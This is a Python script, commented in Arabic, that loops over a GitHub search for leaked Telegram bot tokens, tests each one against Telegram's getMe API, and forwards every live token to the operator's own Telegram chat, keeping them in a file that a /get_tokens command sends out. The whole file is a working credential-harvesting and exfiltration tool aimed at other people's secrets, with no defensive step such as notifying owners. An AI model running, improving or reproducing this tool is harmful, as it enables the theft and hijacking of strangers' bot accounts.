import os
import requests
import threading
import time
import telebot
from scanner import search_for_tokens

GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
FOUND_FILE = "found.txt"

bot = telebot.TeleBot(BOT_TOKEN)

# دالة الاستماع لأوامر التليجرام
@bot.message_handler(commands=['get_tokens'])
def send_tokens(message):
    if str(message.chat.id) == CHAT_ID:
        if os.path.exists(FOUND_FILE):
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "⚠️ ملف التوكنات فارغ أو غير موجود.")

def is_already_found(token):
    if not os.path.exists(FOUND_FILE): return False
    with open(FOUND_FILE, "r") as f:
        return token in f.read()

def mark_as_found(token):
    with open(FOUND_FILE, "a") as f:
        f.write(token + "\n")

def process_token(token):
    check_url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        if requests.get(check_url, timeout=5).status_code == 200:
            if not is_already_found(token):
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, data={"chat_id": CHAT_ID, "text": f"✅ توكن فعال جديد:\n`{token}`", "parse_mode": "Markdown"})
                mark_as_found(token)
    except: pass

def run_scanner():
    while True:
        tokens = search_for_tokens(GITHUB_TOKEN)
        for token in tokens:
            threading.Thread(target=process_token, args=(token,)).start()
        time.sleep(60)

if __name__ == "__main__":
    # تشغيل البوت في خيط منفصل للاستماع للأوامر
    threading.Thread(target=bot.infinity_polling).start()
    # تشغيل الماسح
    run_scanner()
